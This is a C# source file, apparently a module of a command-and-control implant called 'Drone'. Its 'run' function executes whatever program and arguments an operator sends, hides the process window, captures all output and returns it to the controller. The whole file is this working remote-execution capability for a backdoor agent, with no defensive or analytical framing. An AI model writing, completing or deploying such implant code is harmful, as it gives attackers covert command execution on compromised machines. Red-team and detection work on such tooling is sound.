using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;

using Drone.Models;

namespace Drone.Functions;

public class Run : DroneFunction
{
    public override string Name => "run";
    
    public override void Execute(DroneTask task)
    {
        var sb = new StringBuilder();

        using var process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = task.Parameters[0],
                Arguments = string.Join(" ", task.Parameters.Skip(1)),
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                WorkingDirectory = Directory.GetCurrentDirectory(),
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            }
        };

        process.OutputDataReceived += (_, args) => { sb.AppendLine(args.Data); };
        process.ErrorDataReceived += (_, args) => { sb.AppendLine(args.Data); };

        process.Start();
        process.BeginOutputReadLine();
        process.BeginErrorReadLine();
        process.WaitForExit();
        
        Drone.SendOutput(task.TaskId, sb.ToString().TrimEnd());
    }
}